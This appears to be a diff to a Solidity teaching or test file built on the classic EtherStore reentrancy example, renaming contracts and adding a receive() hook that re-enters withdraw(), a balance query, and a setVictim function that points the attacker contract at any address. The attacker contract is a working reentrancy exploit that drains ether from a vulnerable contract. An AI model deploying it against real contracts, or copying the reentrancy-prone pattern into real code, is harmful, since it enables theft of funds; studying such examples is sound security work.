@@ -3,7 +3,7 @@
 
 pragma solidity ^0.8.0;
 
-contract EtherStore {
+contract EtherStore_03 {
     mapping(address => uint) public balances;
  
     function deposit() public payable {
@@ -23,14 +23,19 @@ contract EtherStore {
     function getBalance() public view returns (uint) {
         return address(this).balance;
     }
+
+    function queryCredit(address to) public view returns (uint) {
+        return balances[to];
+    }
+
 }
 
 
-contract Attack {
-    EtherStore public etherStore;
+contract Attacker_03 {
+    EtherStore_03 public etherStore;
 
     constructor(address _etherStoreAddress) {
-        etherStore = EtherStore(_etherStoreAddress);
+        etherStore = EtherStore_03(_etherStoreAddress);
     }
 
     fallback() external payable {
@@ -39,13 +44,23 @@ contract Attack {
         }
     }
 
+    receive() external payable {
+    if (address(etherStore).balance >= 1 ether) {
+        etherStore.withdraw();
+    }
+}
+
     function attack() external payable {
-        require(msg.value >= 1 ether);
+        require(msg.value >= 1 ether, "xxxxxxxxxx");
         etherStore.deposit{value: 1 ether}();
         etherStore.withdraw();
     }
 
     function getBalance() public view returns (uint) {
         return address(this).balance;
+    }
+
+    function setVictim(address addr) public {
+        etherStore = EtherStore_03(addr);
     }
 }
